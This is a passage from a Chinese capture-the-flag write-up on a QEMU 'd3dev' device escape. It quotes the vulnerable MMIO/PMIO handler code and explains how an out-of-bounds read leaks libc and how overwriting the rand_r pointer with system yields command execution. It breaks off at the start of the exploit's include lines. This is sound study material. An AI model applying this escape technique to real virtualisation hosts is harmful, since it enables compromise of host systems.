<li>由于 MMIO 注册内存大小为 0x800，因此 <code>addr</code> 需要小于 0x800，也就是说 <code>addr / 8 &lt; 0x100</code>。</li>
<li><code>seek</code> 在设置的时候有判断要求小于等于 <code>0x100</code>。</li>
</ul>
<p>因此我们可以通过修改 <code>seek</code> 为 0x100 来实现越界读写。</p>
<p>根据 <code>mmio_write_part</code> 的函数的实现逻辑如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">d3dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* 只处理 32-bit 访问 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> idx = s-&gt;seek + ((<span class="type">unsigned</span> <span class="type">int</span>)(addr) &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;mmio_write_part) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> lw = (<span class="type">uint32_t</span>)s-&gt;blocks[idx];</span><br><span class="line">        <span class="type">uint32_t</span> hi = (<span class="type">uint32_t</span>)((s-&gt;blocks[idx] &gt;&gt; <span class="number">32</span>) + val);</span><br><span class="line"></span><br><span class="line">        tea_encrypt_64(&amp;lw, &amp;hi, s-&gt;key);</span><br><span class="line">        s-&gt;blocks[idx] = ((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lw;</span><br><span class="line">        s-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 第一个 32-bit：仅暂存低 32-bit */</span></span><br><span class="line">        s-&gt;blocks[idx] = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        s-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>当 <code>mmio_write_part == 0</code> 时，会将 <code>val</code> 的低 32 比特高位补 0 成 64 比特写入 <code>blocks[seek + addr / 8]</code> 。</p>
</li>
<li><p>当 <code>mmio_write_part == 1</code> 时，会将 <code>(blocks[seek + addr / 8] &amp; 0xFFFFFFFF) | ((blocks[seek + addr / 8] &amp; 0xFFFFFFFF00000000) + (val &lt;&lt; 32))</code> 按如下方式进行加密，然后写入 <code>blocks[seek + addr / 8]</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tea_encrypt_64</span><span class="params">(<span class="type">uint32_t</span> *lw, <span class="type">uint32_t</span> *hi, <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>U;</span><br><span class="line">        *lw += (sum + *hi) ^ (k[<span class="number">1</span>] + (*hi &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">0</span>] + (*hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        *hi += (sum + *lw) ^ (k[<span class="number">3</span>] + (*lw &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">2</span>] + (*lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (sum != <span class="number">0xC6EF3720</span>U);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>因此我们有了越界写的方法：</p>
<ol>
<li>首先我们将要写入的值 <code>val</code> 进行解密运算后得到 <code>val&#39;</code> ；</li>
<li>然后我们首先在 <code>mmio_write_part == 0</code> 的情况下写 <code>val&#39;</code> 的低 32 比特，<strong>此时高 32 位会被置 0，方便高 32 位数据写入</strong>。</li>
<li>之后在 <code>mmio_write_part == 1</code> 的情况下写 <code>val&#39;</code> 的高 32 比特，<strong>并且此时不会影响到上一步写入的低 32 位的数据</strong>。</li>
</ol>
<p>上述过程经过 <code>mmio_write_part</code> 函数的相关操作后等价为越界写了一个值 <code>val</code>。</p>
<p><code>d3dev_mmio_read</code> 函数内容如下，与 <code>d3dev_mmio_write</code> 一样，这个函数同样存在越界操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">d3dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line">    <span class="comment">/* 读取选中的 64-bit 块并解密，然后交替返回低/高 32-bit */</span></span><br><span class="line">    <span class="type">uint64_t</span> blk = s-&gt;blocks[s-&gt;seek + ((<span class="type">unsigned</span> <span class="type">int</span>)(addr) &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">    <span class="type">uint32_t</span> lw  = (<span class="type">uint32_t</span>)blk;</span><br><span class="line">    <span class="type">uint32_t</span> hi  = (<span class="type">uint32_t</span>)(blk &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    tea_decrypt_64(&amp;lw, &amp;hi, s-&gt;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;mmio_read_part) &#123;</span><br><span class="line">        s-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)hi;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)lw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>d3dev_mmio_write</code> 会按照下面的方法解密 <code>blocks[seek + addr / 8]</code> 位置的 8 字节数据，并根据 <code>mmio_read_part</code> 的值是否为 1 决定返回解密结果的高 32 比特或低 32 比特。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tea_decrypt_64</span><span class="params">(<span class="type">uint32_t</span> *lw, <span class="type">uint32_t</span> *hi, <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0xC6EF3720</span>U;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        *hi -= (sum + *lw) ^ (k[<span class="number">3</span>] + (*lw &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">2</span>] + (*lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        *lw -= (sum + *hi) ^ (k[<span class="number">1</span>] + (*hi &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">0</span>] + (*hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>U; <span class="comment">/* unsigned 加法：等价于 sum -= 0x9E3779B9 */</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (sum != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然而泄露的数据是被加密的，而我们没有秘钥无法解密。</p>
<p>但是当 <code>mmio_write_part == 1</code> 时，会将 <code>(blocks[seek + addr / 8] &amp; 0xFFFFFFFF) | ((blocks[seek + addr / 8] &amp; 0xFFFFFFFF00000000) + (val &lt;&lt; 32))</code> 加密然后写入 <code>blocks[seek + addr / 8]</code>。我们设置 <code>val = 0</code>，则效果相当于越界加密了一个 64 位的数据。</p>
<p>之后我们再利用越界读将加密的数据解密读出来就可以泄露对应位置原本的数据了。</p>
<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>blocks</code> 可以越界读泄露 <code>rand_r</code> 存储的 <code>rand_r</code> 函数地址，进而泄露 libc 基址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> &#123;</span></span><br><span class="line">    PCIDevice  pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> memory_mode;</span><br><span class="line">    <span class="type">uint32_t</span> seek;</span><br><span class="line">    <span class="type">uint32_t</span> init_flag;</span><br><span class="line">    <span class="type">uint32_t</span> mmio_read_part;</span><br><span class="line">    <span class="type">uint32_t</span> mmio_write_part;</span><br><span class="line">    <span class="type">uint32_t</span> r_seed;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> blocks[<span class="number">0x101</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> ( *rand_r)(<span class="type">uint32_t</span> *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>d3dev_pmio_write</code> 的 0x04 分支可以清空 <code>key</code> 字段，因此 <code>key</code> 已知。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x04</span>:  <span class="comment">/* 清空 key[0..3] */</span></span><br><span class="line">    <span class="built_in">memset</span>(s-&gt;key, <span class="number">0</span>, <span class="keyword">sizeof</span>(s-&gt;key));</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>d3dev_pmio_write</code> 的 0x1C 功能可以回调 <code>rand_r</code> 函数指针，参数为 <code>r_seed</code> 的地址。并且在调用回调函数前可以设置 <code>r_seed</code> 的值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x1C</span>:  <span class="comment">/* 写入种子并用 rand_r 生成 key[0..3] */</span></span><br><span class="line">    s-&gt;r_seed = (<span class="type">uint32_t</span>)val;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> *p = s-&gt;key;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            *p++ = (<span class="type">uint32_t</span>)s-&gt;rand_r(&amp;s-&gt;r_seed);</span><br><span class="line">        &#125; <span class="keyword">while</span> (p != (<span class="type">uint32_t</span> *)&amp;s-&gt;rand_r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>因此可以越界写修改 <code>rand_r</code> 为 <code>system</code> 函数地址，并且在 <code>r_seed</code> 中写入要传入的命令。</p>
<p>不过这里 <code>r_seed</code> 只能写入 4 字节，命令 4 字节之后的内容需要写到 <code>block</code> 中。</p>
<h2 id="完整-Exp-4"><a href="#完整-Exp-4" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 